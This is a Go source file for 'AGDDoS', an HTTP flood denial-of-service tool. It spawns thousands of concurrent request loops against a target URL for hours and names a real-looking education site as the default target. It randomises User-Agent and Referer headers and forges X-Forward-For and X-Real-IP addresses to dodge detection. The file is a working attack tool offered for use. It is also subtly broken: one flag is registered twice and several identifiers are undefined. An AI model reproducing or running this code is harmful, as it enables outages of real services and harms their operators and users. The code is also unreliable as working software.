package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"time"
)

// X args
var (
	timestamp = "unknown"
	version   = "unknown"
)
var (
	Method              string
	TargetUrl           string
	IntervalMillisecond int
	ConcurrencyCount    int
	DurationMinute      int

	//TODO：Socks5 Proxy
	DDosHttpClient = &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (conn net.Conn, e error) {
				dialer := net.Dialer{
					Timeout:   30 * time.Second, // 超时时间
					KeepAlive: 60 * time.Second, // KeepAlive时间
				}
				return dialer.Dial(network, addr)
			},
		},
	}
)

// Main Function
func main() {
	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
	printWelcome()
	// Parse Flags / 解析命令行参数
	flag.BoolVar(&DisplayTotal, "u", false, "显示统计（未上线）")
	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "并发线程数量")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "每个线程执行攻击的频率(ms)")
	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
	flag.Parse()

	if TargetUrl == defaultTargetUrl {
		fmt.Printf("TargetUrl is %s, 请尝试通过命令行重传参数启动(TargetUrl 不能等于 defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
		return
	}
	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
}

func DoAttacking(grindex int) {
	for i := 0; ; i++ {
		if result, err := DoHttpRequest(); err != nil {
			PrintError(grindex, i, err.Error()) // Red. Client ERROR
			runtime.GC()                        // Clean up memory to prevent memory overflow
		} else {
			responseStatus := fmt.Sprintf("\033[1;32;40m (%s)", *result)                // Green. Status code is 200
			if !strings.Contains(*result, "200") && !strings.Contains(*result, "301") { // Status code is not 200/301
				responseStatus = fmt.Sprintf("\033[1;35;40m (%s)", *result) // Purple. Status code is 400/402/403/404/500/501/502/...
			}
			Log(grindex, i, responseStatus)
		}
		time.Sleep(time.Duration(IntervalMillisecond) * time.Millisecond)
		runtime.GC() // Clean up memory to prevent memory overflow
	}
}

func DoHttpRequest() (*string, error) {
	request, err := http.NewRequest(Method, TargetUrl, nil)
	if err != nil {
		return nil, err
	}
	// Make yourself don't look like a robot
	request.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])      // 生成伪UA
	request.Header.Set("Referrer", Refs[rand.Intn(len(Refs))])                    // 生成伪来源页面的地址
	request.Header.Set("Accept", "*/*")                                           // 接受所有
	request.Header.Set("Accept-encoding", "gzip, deflate, br")                    // 声明浏览器支持的编码类型
	request.Header.Set("Accept-language", "zh-CN,zh-TW;q=0.9")                    // 接受网页语言
	request.Header.Set("X-Forward-For", "186.240.156.78,1.4.72.237,"+genIpaddr()) // 多 层 代 理
	request.Header.Set("X-Real-IP", "186.240.156.78")                             // 多 层 代 理
	request.Header.Set("DDoS-Powered-By", "AGDDoS")

	response, err := DDosHttpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	// Ignore and read the responseBody
	_, _ = ioutil.ReadAll(response.Body)
	runtime.GC() // Clean up memory to prevent memory overflow
	return &response.Status, err
}

// This is used to generate random IP addresses
func genIpaddr() string {
	rand.Seed(time.Now().Unix())
	ip := fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255))
	return ip
}

func printWelcome() {
	fmt.Println(WelcomeMsg)
	// Sleep one second because the fmt is not thread-safety.
	// If not to do this, fmt.Print will print after the log.Print.
	time.Sleep(time.Second)
}

func printTotal(*string, int) {
	// TODO: #11 add Total print.
}
